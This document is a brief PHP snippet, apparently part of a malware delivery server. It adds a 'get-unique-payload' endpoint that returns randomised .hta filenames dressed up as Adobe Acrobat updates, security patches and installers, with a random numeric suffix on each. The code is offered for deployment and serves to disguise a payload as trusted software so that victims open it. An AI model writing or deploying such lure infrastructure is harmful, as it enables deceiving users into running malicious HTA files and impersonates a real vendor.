// UNIQUE PAYLOAD ENDPOINT - ADD THIS AT TOP OF post.php
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['route']) && $_GET['route'] === 'get-unique-payload') {
    header('Content-Type: application/json');
    $themes = ['Adobe_Acrobat_Update', 'PDF_Security_Patch', 'Document_Viewer_Pro', 'Acrobat_DC_Installer'];
    $theme = $themes[array_rand($themes)];
    $uniqueId = str_pad(mt_rand(0, 999999), 6, '0', STR_PAD_LEFT);
    $filename = $theme . '_' . $uniqueId . '.hta';
    echo json_encode(['filename' => $filename]);
    exit;
}